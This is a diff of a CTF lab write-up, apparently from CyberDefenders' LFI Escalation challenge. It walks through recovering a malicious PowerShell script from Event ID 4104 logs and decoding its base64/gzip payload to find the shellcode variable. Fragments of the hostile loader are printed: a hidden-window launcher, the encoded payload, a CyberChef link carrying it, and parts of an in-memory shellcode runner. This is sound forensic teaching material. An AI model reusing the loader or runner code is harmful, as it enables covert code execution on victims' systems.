@@ -1,20 +1,14 @@
 # :globe_with_meridians: Lfi Escalation Lab Writeup Cyberdefenders 10Ddfb745Ced
 
-> **Original Source:** [Lfi Escalation Lab Writeup Cyberdefenders 10Ddfb745Ced](https://infosecwriteups.com/lfi-escalation-lab-writeup-cyberdefenders-10ddfb745ced)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 >
 
 *Q15: The PowerShell script executed shellcode as part of its payload. What is the name of the variable that stores the raw shellcode in the script?*
 
-
 since it’s a powershell script, we can investigate the powershell operational log file as it records the actual powershell code that executed, including decoded and de-obfuscated script blocks with Event ID 4104, so with a quick filter on event id 4104, and `LykIsnWn.ps1`we got one single event:
 
-
 now, we’ve got a huge base64 encoded command, let’s decode it:
-
 
 ```
 if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+
@@ -56,9 +50,7 @@ $s.WindowStyle='Hidden';$s.CreateNoWindow=$true;
 $p=[System.Diagnostics.Process]::Start($s);
 ```
 
-
 so what’s happening here is:
-
 
 ```
 1- Base64 decode the payload
@@ -68,9 +60,7 @@ so what’s happening here is:
 5- Execute it in memory
 ```
 
-
 By following this sequence in reverse, the payload can be decoded by:
-
 
 ```
 1- Extract the encoded payload string
@@ -83,9 +73,7 @@ By following this sequence in reverse, the payload can be decoded by:
 ➡️ Encoded string → formatted → decoded → decompressed → readable script
 ```
 
-
 so let’s extract the shellcode:
-
 
 ```
 H4sIAMGAvmgCA7VWa4/aOhD9Xqn/''+''IaqQkqhZCA/1LitVuglsgJawsOGxQFHlTQy4m
@@ -116,12 +104,9 @@ vVNPNI1Ac2LyecTZ5L9xw4/QoSDnQP6SXHS0S9hkF6Rs8pCUYD+8/QR
 H7h{0}Eb/qwCdTrOD/AhBI1txXCwAA
 ```
 
-
 with this amazing cyberchef recipe, we can decode all of it perfectly [LINK](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C'%5C'%2B%5C'%5C''%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%7B0%7D'%7D,'3',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFNR0F2bWdDQTdWV2E0L2FPaEQ5WHFuLycnKycnSWFxUWtxaFpDQS8xTGl0VnVnbHNnSmF3c09HeFFGSGxUUXk0bQpCZ1NoNGQ2Kzkvdk9JK0YxYkxWezB9aXMxRXNLeFo4YmpNOGRuTW85OGx4UG1TNGRINmVmN2QxTDZkRkdBMXBLUzJ4NUsxezB9MU4KeXUwNjZta3g1NFlUNmJPa1RJezB9TnBzJycrJyc3V2lQaXptNXRhRkFUWTU4bDd2b0c1RVlaNC9VZ0pEaFZWK2tjYUxYR0FyKzQKZWYyQ1hTeitsezB9JycrJydQZDhnN0pIUkZPell3MjVTeXhkR2I0bjF0ck1SU0t0dkxPaGhDdnl0Mit5T3IwcXp2S3swfTJ3alJVCkpHZFk4anhPdTlSS3F2U0wxVnMyRDl1c0NMYnhBMVl5T1k4UHlKK3VaUWYrQ0dhNHc1RTIyRWI4eVh6UWhuT2NqcE5nSGtVK1BHaApSSlRFUnBGaDJBMllhezB9aGVnTU5RMXFTcGlEK2R6ZjVXcHVubTk1SFB5UnJuV3o3SEFkczRPTmdSRjRmNUp2JycrJydJOWl1L3gKZkFaZURnK0l2NWlwS3BqdDJBb3JPVCtpVkpQK1N4aWxnL2NaZEc5MVVzNmR3S3JMQTFXRGlyNDhwczI4aU9MRVViNlFaMElDRlo2CkVDSURlTHdIZ1BLTU8rblNCT3FlSjdKbkdLeGp5VmJvc0pMSHJaMG5YSkJ1MlJwd0ZSezB9ak45WU1JcTdNbnRLVWM5ezB9cGI3YQp7MH1SaXBrck9KSUZURXlIakhpemsvdXowdWNXMVZEWXZNN2pPcDRUSDllUFBsb1RONk9xY3FrZWVFNXhERWMrTSt0QWVvcWNMbUMKdmppbGVJQzRnRnJSNDRYJycrJydhN0p2ekoxNHdJOVhCZ3VGRFRFTEtDY3F2UGswbXFwc2d0ezB9OFonJysnJ3J3QzU1QjU3bTVuCkJCY0dhZFhvcGp0cnQ0QnlPNVJsRVlhbEl7MH1naHZxYXBLREVjV2VKaGwrU05JbEkrSXNIc3FuZE8ySWN1S2lrR2ZoWnVwek5OTgpkYTh3UGVSQzVVRlJBb085c3MnJysnJ0VzUUZZQm9VcE40MkR3NlpKSHRMbCtFbzRZb2hZc0RrWFpRRCcnKycncGdSTURoY1VDV0EKUkdOYXFIa0g4OVo2US9FYWJHTEJzQ2hhZ0R5azF5UG1GbHBnVDc2JycrJydjWnswfVlMRXNvTFhESkF6cktFWWp1VWNVMGFrb0NECitnaU14ZnovU09HbDZvaGNhZ0ZPSycnKycnNk5rZDJ0cUgnJysnJ3JtZ2Z3NjVadjFhY0RSRktNWWo0SUNGRmJDMWlVTDhxWkpJagpQS2hjRWU2JycrJydCanpqbGs5dDc4dUtGRnQ3K05ud0c5anpqMjJYTExwY1oydmJyWVhkaG5WdGtQMWk3MTV7MH1ETmY3NHVHcQpNNnh3NTdiRmExMmoyU082V1ZtNnB0Nkg4YURGVzQwV0g3ZU1abi9wVXIxN3V6b1VLcUZPOXMyUmlKWEUnJysnJ2NDdVY1b051bApNdVZ1N0srQXZUR3BMaFlHVjVuVGZhSE5veCcnKycnQlMrL2FaaXMwOVJhOS9WSzdmeHlWck1tSU5nc1Zhemtmc2RENU5LNFhDbwpXcWgrcjIwVEJNNXBYdDQwUHhudldiN3RxcytLeFFyVlZXeHExaDFQemJvVycnKycnV3lyMk16TUxxRklWcHMyUDRycWRMR29tYQpZbGt2d3BEZXd6RjdQTW8xQjQ4ZTJYaTBzQ3RYUkExcWFvMkdKVERZUDkwdDR0L2JObmx7MH1RS3kwUEg5aDFlMFNHT3hITHswfQpKclc1QUVaN2NuUktoU0s0N0NFVmlZelRBRFdtbXlOeG5LOHNib1UvUHVERWpPR3RIT3k3VFhyWDkxSjhhL1EvdndCS2prZEVKKwpYUzdNY0svOW9DcWw3L3k1SHltZkZmRXswfUViUlNFUzBTaHknJysnJ0NEUDJWV3onJysnJ1dHQ2xpdHRsUkhnb0NqVHRGUTU4ClRLSFJRU3ZNR0dwUXlseWg5cURNMEdjUzlSZk5hTkNLRTdvMFVxVW5RL1hVQkxLcG01c0paQWljai9tWWIyTi93WmVhZmlqck9nCmk0ZnRBck1idmZmckFhMnh5VkpKb21lZ0FBOHhTZHh0RWhJSmxMaXZLbndZSXV6MEZ6WG9Qck5lUmd7MH14VW9CQ2hXY25FRmZpClpqOUJ5OStGQlBMSGdHSFdCV2hHTlBSWHVQK1FFQnJ2QVdSRVgwdi9OK210dDlyLzVKenFUcXM0US83L2VjT2N7MH0nJysnJzlaCnZWTlBOSTFBYzJMeWVjVFo1TDl4dzQvUW9TRG5RUDZTWEhTMFM5aGtGNlJzOHBDVVlEKzgvUVIKSDdoezB9RWIvcXdDZFRyT0QvQWhCSTF0eFhDd0FB&oeol=CRLF):
 
-
 so now, by reading the following decoded script, we can answer easily:
-
 
 ```
 function xb {
@@ -182,12 +167,8 @@ $i3,[IntPtr]::Zero,0,[IntPtr]::Zero)
 Invoke($v_9,0xffffffff) | Out-Null }
 ```
 
-
 >
 
 `*acBD8*`
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/lfi-escalation-lab-writeup-cyberdefenders-10ddfb745ced). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
